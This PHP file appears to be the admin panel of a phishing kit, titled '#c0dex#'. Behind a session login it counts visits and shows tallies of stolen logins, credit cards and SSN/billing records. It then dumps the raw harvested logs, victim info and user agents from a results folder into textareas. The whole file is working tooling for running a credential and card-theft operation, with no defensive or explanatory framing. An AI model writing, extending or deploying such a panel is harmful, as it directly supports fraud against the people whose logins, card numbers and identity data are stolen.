<?php
session_start();
require 'config.php';

if (!isset($_SESSION['login'])) {
    header('Location: login.php');
    exit();
}

function count_c($filename)
{
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_click = count_c("../results/total_click.txt");
$total_cc = count_c("../results/cc.txt");
$total_ssn = count_c("../results/ssn.txt");
$total_logins = count_c("../results/logins.txt");
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>#c0dex#</title>
    <meta name="description" content="description here">
    <meta name="keywords" content="keywords,here">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
    <link href="https://unpkg.com/tailwindcss/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.min.js" integrity="sha256-XF29CBwU1MWLaGEnsELogU6Y6rcc5nCkhhx89nFMIDQ=" crossorigin="anonymous"></script>

    <link rel="stylesheet" href="css/csss.css">

</head>

<body class="bg-black-alt font-sans leading-normal tracking-normal">
    <?php include 'inc/header.php'; ?>
    <!--Container-->
    <div class="container w-full mx-auto pt-20">

        <div class="w-full px-4 md:px-0 md:mt-8 mb-16 text-gray-800 leading-normal">

            <!--Console Content-->

            <div class="flex flex-wrap">
                <div class="w-full md:w-1/2 xl:w-1/4 p-2">
                    <!--Data Card-->
                    <div class="bg-gray-900 border border-gray-800 rounded shadow p-2">
                        <div class="flex flex-row items-center">
                            <div class="flex-shrink pr-4">
                                <div class="rounded p-3 bg-600"><i class="fa fa-eye fa-2x fa-fw fa-inverse"></i></div>
                            </div>
                            <div class="flex-1 text-right md:text-center">
                                <h5 class="font-bold uppercase text-gray-400">Visits</h5>
                                <h3 class="font-bold text-3xl text-gray-600"><?php echo $total_click; ?> </h3>
                            </div>
                        </div>
                    </div>
                    <!--/Data Card-->
                </div>

                <div class="w-full md:w-1/2 xl:w-1/4 p-3">
                    <!--Data Card-->
                    <div class="bg-gray-900 border border-gray-800 rounded shadow p-2">
                        <div class="flex flex-row items-center">
                            <div class="flex-shrink pr-4">
                                <div class="rounded p-3 bg-600"><i class="fas fa-key fa-2x fa-fw fa-inverse"></i></div>
                            </div>
                            <div class="flex-1 text-right md:text-center">
                                <h5 class="font-bold uppercase text-gray-400">Logins</h5>
                                <h3 class="font-bold text-3xl text-gray-600"><?php echo $total_logins; ?> </h3>
                            </div>
                        </div>
                    </div>
                    <!--/Data Card-->
                </div>
                <div class="w-full md:w-1/2 xl:w-1/4 p-3">
                    <!--Data Card-->
                    <div class="bg-gray-900 border border-gray-800 rounded shadow p-2">
                        <div class="flex flex-row items-center">
                            <div class="flex-shrink pr-4">
                                <div class="rounded p-3 bg-600"><i class="fas fa-credit-card fa-2x fa-fw fa-inverse"></i></div>
                            </div>
                            <div class="flex-1 text-right md:text-center">
                                <h5 class="font-bold uppercase text-gray-400">Credit Cards</h5>
                                <h3 class="font-bold text-3xl text-gray-600"><?php echo $total_cc; ?> </h3>
                            </div>
                        </div>
                    </div>
                    <!--/Data Card-->
                </div>
                <div class="w-full md:w-1/2 xl:w-1/4 p-3">
                    <!--Data Card-->
                    <div class="bg-gray-900 border border-gray-800 rounded shadow p-2">
                        <div class="flex flex-row items-center">
                            <div class="flex-shrink pr-4">
                                <div class="rounded p-3 bg-600"><i class="fab fa-cc-visa fa-2x fa-fw fa-inverse"></i></div>
                            </div>
                            <div class="flex-1 text-right md:text-center">
                                <h5 class="font-bold uppercase text-gray-400">BILLING</h5>
                                <h3 class="font-bold text-3xl text-gray-600"><?php echo $total_ssn; ?> </h3>
                            </div>
                        </div>
                    </div>
                    <!--/Data Card-->
                </div>

            </div>

            <div class="w-full p-3">
                <!--Table Card-->
                <div class="bg-gray-900 border border-gray-800 rounded shadow">
                    <div class="border-b border-gray-800 p-3">
                        <h5 class="font-bold uppercase text-gray-600">LOGS</h5>
                    </div>
                    <div class="p-5">
                        <div class="w-full p-5 text-gray-700">
                        <?php $logs = file_get_contents('../results/logins.txt'); ?>
                            <textarea name="logs" rows="3"><?php echo $logs; ?></textarea>


                            <?php $logs = file_get_contents('../results/cc.txt'); ?>
                            <textarea name="logs" rows="5"><?php echo $logs; ?></textarea>

                            <?php $logs = file_get_contents('../results/ssn.txt'); ?>
                            <textarea name="logs" rows="3"><?php echo $logs; ?></textarea>
							

                            <?php $UserAgents = file_get_contents('../results/info.txt'); ?>
                            <textarea name="info" rows="3"><?php echo $UserAgents; ?></textarea>

                            <?php $UserAgents = file_get_contents('../results/UserAgents.txt'); ?>
                            <textarea name="UserAgents" rows="3"><?php echo $UserAgents; ?></textarea>


                        </div>
                    </div>


                </div>
                <?php include 'inc/footer.php'; ?>
                <script src="js/js.js"></script>
</body>

</html>